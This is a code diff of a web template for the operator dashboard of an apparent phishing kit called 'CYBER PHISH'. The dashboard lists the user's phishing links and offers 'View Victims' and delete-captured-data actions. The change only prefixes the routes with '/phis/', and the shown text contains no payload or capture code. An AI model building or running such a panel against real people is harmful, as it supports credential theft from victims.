@@ -21,12 +21,12 @@
 </head>
 <body>
 <div class="container">
-    <div class="logout"><a href="/logout">🚪 Logout</a></div>
+    <div class="logout"><a href="/phis/logout">🚪 Logout</a></div>
     <div class="glass-card">
         <div class="brand">🔐 CYBER PHISH</div>
         <div class="flex-between">
             <h2>Dashboard, {{ user }}</h2>
-            <a href="/create_link" class="btn-small">➕ New Link</a>
+            <a href="/phis/create_link" class="btn-small">➕ New Link</a>
         </div>
         <h3>Your Phishing Links</h3>
         {% for link in links %}
@@ -36,8 +36,8 @@
             <div class="flex-between">
                 <small>Created: {{ link.created_at }}</small>
                 <div>
-                    <a href="/victims/{{ link.link_id }}">👁️ View Victims</a>
-                    <a href="/delete_link/{{ link.link_id }}" class="delete-btn" onclick="return confirm('Delete this link and all captured data?');">🗑️ Delete</a>
+                    <a href="/phis/victims/{{ link.link_id }}">👁️ View Victims</a>
+                    <a href="/phis/delete_link/{{ link.link_id }}" class="delete-btn" onclick="return confirm('Delete this link and all captured data?');">🗑️ Delete</a>
                 </div>
             </div>
         </div>
